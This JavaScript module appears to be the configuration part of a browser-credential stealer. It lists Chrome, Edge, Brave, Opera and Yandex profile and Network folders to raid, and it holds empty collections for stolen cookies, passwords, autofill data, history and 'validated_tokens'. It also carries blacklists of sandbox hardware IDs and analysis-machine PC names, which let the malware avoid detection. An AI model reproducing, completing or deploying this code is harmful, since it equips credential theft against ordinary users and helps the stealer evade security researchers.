module.exports = (client) => {
    return {

        blacklisted_programs: [
            "fuckyou",
        ],

        blacklisted_hwids: ["7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65",
            "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4"
        ],

        password_and_cookies_paths: [
            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Default\\',
            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 1\\',
            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 2\\',
            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 3\\',
            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 4\\',
            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 5\\',
            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Guest Profile\\',
            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Default\\Network\\',
            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
            process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
            process.env.APPDATA + '\\Opera Software\\Opera Stable\\',
            process.env.APPDATA + '\\Opera Software\\Opera GX Stable\\',
            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Default\\',
            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
            process.env.LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
            process.env.LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
            process.env.LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
        ],

        blacklisted_pc_names: ["WDAGUtilityAccount", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank",
            "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC",
            "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH",
        ],


        cookies: {
            all: []
        },

        passwords: {
            all: []
        },

        bookmarks: {
            all: []
        },

        history: {
            all: []
        },

        autofill: {
            all: []
        },

        keywords: {
            cookies: [],
            passwords: [],
            bookmarks: [],
            history: [],
            autofill: [],
        },

        validated_tokens: [],
    }
}